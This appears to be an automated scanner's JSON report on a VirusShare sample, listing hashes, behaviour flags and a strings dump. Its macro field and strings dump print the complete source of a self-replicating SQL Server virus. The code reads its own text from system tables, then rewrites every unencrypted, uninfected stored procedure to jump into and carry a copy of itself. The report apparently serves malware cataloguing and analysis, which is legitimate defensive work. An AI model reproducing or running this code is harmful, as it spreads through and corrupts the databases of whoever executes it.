{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "EXEC": "May run an executable file or a system command using Excel 4 Macros",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "OPEN": "May open a file"
        },
        "macro": "SET QUOTED_IDENTIFIER OFF \nGO\nSET ANSI_NULLS OFF \nGO\n\nCREATE PROCEDURE Virus \nAS\nSET NOCOUNT ON\nGOTO Virus\nVirusDone:\nreturn\nVirus:\n--Joseph Gama\ufffd\ndeclare @current_proc varchar(255),@current_text varchar(8000),@VirusCode varchar(8000),@cmd varchar(8000),@a int,@b int,@Vsize int\n--get Virus code\nset @VirusCode=(SELECT c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type='p' and (o.category=0) and (o.id = @@Procid))\nset @a=CHARINDEX('Virus:',@VirusCode)\nset @b=CHARINDEX(convert(varchar(20),0x474F544F205669727573446F6E65),@VirusCode)\nset @VirusCode=SUBSTRING(@VirusCode, @a-10, @b-@a+25)\nSET @Vsize=datalength(@VirusCode)\nDECLARE _Cursor CURSOR FOR SELECT o.name,c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type='p' and o.category=0 and encrypted=0\nOPEN _Cursor\nFETCH NEXT FROM _Cursor INTO @current_proc, @current_text\nWHILE @@FETCH_STATUS=0\nBEGIN \n--is there room for the virus?\nIF (SELECT count(name) FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE name=@current_proc)>1 GOTO IgnoreSP\nIF datalength(@current_text)+@Vsize+23>8000 GOTO IgnoreSP\n--is it infected?\nIF CHARINDEX('VirusDone:',@current_text)>0 GOTO IgnoreSP\nSET @cmd =  replace(@current_text, 'CREATE PROCEDURE ' + @current_proc, 'ALTER PROCEDURE ' + @current_proc )\nset @a=1\ntry2:\nset @a=CHARINDEX('as',@cmd,(@a+1))\nIF @a>0 and ascii(SUBSTRING(@cmd,@a-1,1)) NOT IN (32,13,10,9,0) GOTO try2\nIF @a>0 and ascii(SUBSTRING(@cmd,@a+2,1)) NOT IN (32,13,10,9,0) GOTO try2\nset @b=@a\n--avoid --\nwhile (@b>1) and (ascii(SUBSTRING(@cmd,@b,1))<>13) set @b=@b-1\nif CHARINDEX('--',SUBSTRING(@cmd,@b,@a-@b))>0  GOTO try2\n--avoid /*\nset @b=@a\nwhile (@b>2) and (SUBSTRING(@cmd,@b,1)<>'*') and (SUBSTRING(@cmd,@b-1,1)<>'/') set @b=@b-1\nif (@b<@a)and (CHARINDEX('*/',@cmd,@b)>@a)  GOTO try2\nset @cmd=stuff(@cmd, @a+2,1,char(13)+'GOTO Virus'+char(13)+'VirusDone:'+char(13))\n--add virus code to SP\nset @cmd=@cmd+@VirusCode\nEXEC( @cmd)\nIgnoreSP:\nFETCH NEXT FROM _Cursor INTO @current_proc, @current_text\nEND\nCLOSE _Cursor\nDEALLOCATE _Cursor\nGOTO VirusDone\nGO\nSET QUOTED_IDENTIFIER OFF \nGO\nSET ANSI_NULLS ON \nGO\n"
    },
    "filename": "VirusShare_0152b1ff32c57b7ade069bf265c90a95",
    "filesize": 2186,
    "filetype": "ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "0152b1ff32c57b7ade069bf265c90a95",
        "sha1": "91f6647e934422e410d6b894d1a5c73eff11b6d9",
        "sha256": "345f8b04e8cedc8b589c76b0c9945f054be6d4177f3f847e5dd1e303c75aa9f1"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "SET QUOTED_IDENTIFIER OFF ",
            "SET ANSI_NULLS OFF ",
            "CREATE PROCEDURE Virus ",
            "SET NOCOUNT ON",
            "GOTO Virus",
            "VirusDone:",
            "return",
            "Virus:",
            "--Joseph Gama",
            "declare @current_proc varchar(255),@current_text varchar(8000),@VirusCode varchar(8000),@cmd varchar(8000),@a int,@b int,@Vsize int",
            "--get Virus code",
            "set @VirusCode=(SELECT c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type='p' and (o.category=0) and (o.id = @@Procid))",
            "set @a=CHARINDEX('Virus:',@VirusCode)",
            "set @b=CHARINDEX(convert(varchar(20),0x474F544F205669727573446F6E65),@VirusCode)",
            "set @VirusCode=SUBSTRING(@VirusCode, @a-10, @b-@a+25)",
            "SET @Vsize=datalength(@VirusCode)",
            "DECLARE _Cursor CURSOR FOR SELECT o.name,c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type='p' and o.category=0 and encrypted=0",
            "OPEN _Cursor",
            "FETCH NEXT FROM _Cursor INTO @current_proc, @current_text",
            "WHILE @@FETCH_STATUS=0",
            "BEGIN ",
            "--is there room for the virus?",
            "IF (SELECT count(name) FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE name=@current_proc)>1 GOTO IgnoreSP",
            "IF datalength(@current_text)+@Vsize+23>8000 GOTO IgnoreSP",
            "--is it infected?",
            "IF CHARINDEX('VirusDone:',@current_text)>0 GOTO IgnoreSP",
            "SET @cmd =  replace(@current_text, 'CREATE PROCEDURE ' + @current_proc, 'ALTER PROCEDURE ' + @current_proc )",
            "set @a=1",
            "try2:",
            "set @a=CHARINDEX('as',@cmd,(@a+1))",
            "IF @a>0 and ascii(SUBSTRING(@cmd,@a-1,1)) NOT IN (32,13,10,9,0) GOTO try2",
            "IF @a>0 and ascii(SUBSTRING(@cmd,@a+2,1)) NOT IN (32,13,10,9,0) GOTO try2",
            "set @b=@a",
            "--avoid --",
            "while (@b>1) and (ascii(SUBSTRING(@cmd,@b,1))<>13) set @b=@b-1",
            "if CHARINDEX('--',SUBSTRING(@cmd,@b,@a-@b))>0  GOTO try2",
            "--avoid /*",
            "set @b=@a",
            "while (@b>2) and (SUBSTRING(@cmd,@b,1)<>'*') and (SUBSTRING(@cmd,@b-1,1)<>'/') set @b=@b-1",
            "if (@b<@a)and (CHARINDEX('*/',@cmd,@b)>@a)  GOTO try2",
            "set @cmd=stuff(@cmd, @a+2,1,char(13)+'GOTO Virus'+char(13)+'VirusDone:'+char(13))",
            "--add virus code to SP",
            "set @cmd=@cmd+@VirusCode",
            "EXEC( @cmd)",
            "IgnoreSP:",
            "FETCH NEXT FROM _Cursor INTO @current_proc, @current_text",
            "CLOSE _Cursor",
            "DEALLOCATE _Cursor",
            "GOTO VirusDone",
            "SET QUOTED_IDENTIFIER OFF ",
            "SET ANSI_NULLS ON "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.303449",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
